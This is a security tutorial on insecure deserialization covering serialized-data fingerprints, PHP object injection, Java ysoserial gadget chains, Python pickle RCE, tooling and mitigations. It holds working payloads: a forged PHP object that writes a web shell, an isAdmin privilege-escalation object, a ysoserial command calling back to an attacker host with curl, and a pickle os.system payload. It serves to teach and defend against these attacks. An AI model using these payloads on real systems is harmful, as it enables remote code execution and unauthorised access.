# What is Insecure Deserialization?

Insecure Deserialization is when an app takes serialized data from an untrusted source and rebuilds objects from it without validation. Because deserialization can trigger constructors, magic methods, and property setters, a crafted payload can hijack that process - leading to remote code execution, auth bypass, or object injection. It is hard to spot and often devastating.

## How it works

- The app serializes objects to send/store them (cookies, tokens, caches, queues, ViewState)
- An attacker tampers with or forges the serialized blob
- On deserialization, magic methods run (`__wakeup`, `__destruct`, `readObject`) and a **gadget chain** of existing classes can be strung together to run code

## Impact

- **Remote code execution** (gadget chains)
- Authentication bypass / privilege escalation (object injection - flip `isAdmin`)
- SQL injection, path traversal, DoS via crafted objects

## Step 1 - Identify serialized data (fingerprints)

```text
Java     -> base64 starting with "rO0AB" (raw hex AC ED 00 05)
PHP      -> serialize() output: O:4:"User":2:{s:4:"name";...}
Python   -> pickle: base64 often starts with "gAS" or contains "\x80\x04"
.NET     -> BinaryFormatter / ViewState (base64, often "AAEAAAD/////")
Ruby     -> Marshal: "\x04\x08"
Node.js  -> node-serialize: {"rce":"_$$ND_FUNC$$_function..."}
```

Look in: cookies, hidden form fields, `Authorization`/custom headers, API bodies, cache keys, message queues, file uploads.

## Step 2 - PHP object injection (manual, no tools)

Given vulnerable code with a dangerous `__destruct`:

```php
class Logger { public $file='app.log'; public $data='';
  function __destruct(){ file_put_contents($this->file, $this->data); } }
// VULNERABLE: unserialize($_COOKIE['data']);
```

Forge a serialized object that writes a web shell:

```php
O:6:"Logger":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:29:"<?php system($_GET['cmd']);?>";}
```

Privilege-escalation style object injection:

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
```

## Step 3 - Java RCE with ysoserial

```bash
# Generate a gadget chain (needs the vulnerable lib on the classpath)
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.oastify.com' | base64 -w0

# Common gadget chains to try: CommonsCollections1-7, CommonsBeanutils1,
# Groovy1, Spring1, ROME, Hibernate1

# URL-safe encode and drop into the cookie/param, watch your OAST for the callback
```

## Step 4 - Python pickle RCE

```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())))
# Send this base64 where the app calls pickle.loads()
```

## Tools

- [ysoserial](https://github.com/frohoff/ysoserial) - Java gadget chains
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - .NET (ViewState, BinaryFormatter)
- [PHPGGC](https://github.com/ambionics/phpggc) - PHP gadget chain generator
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) (Burp extension)

```bash
# PHPGGC - list chains and build one
phpggc -l
phpggc Symfony/RCE4 system id
```

## Mitigation - the fix

- **Do not deserialize untrusted data.** Prefer JSON/protobuf with a strict schema.
- If unavoidable, **sign** blobs with HMAC and verify before deserializing.
- Use **allowlists** of permitted classes (`ObjectInputFilter` in Java, `__reduce__` restrictions).
- Disable dangerous formatters: `BinaryFormatter` (.NET), avoid `pickle`/`Marshal` on untrusted input.
- Keep libraries patched to remove known gadget chains.

## Practice

- [PortSwigger deserialization labs](https://portswigger.net/web-security/deserialization)

## Deep dive

- [Insecure Deserialization - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger deserialization labs](https://portswigger.net/web-security/deserialization)

## CWE

- CWE-502: Deserialization of Untrusted Data
